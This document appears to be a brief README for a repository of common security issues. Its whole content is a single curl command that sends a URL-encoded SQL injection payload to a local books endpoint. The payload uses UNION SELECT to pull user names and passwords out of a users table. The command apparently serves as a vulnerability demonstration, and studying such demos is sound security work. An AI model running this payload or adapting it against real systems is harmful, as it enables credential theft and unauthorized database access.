# commons-security-issues

curl --silent --location --request GET 'localhost:3000/books?name=%27)%20UNION%20select%20id,(name||%27%20pass:%27||password)%20FROM%20users%20ORDER%20BY%201%20--%20'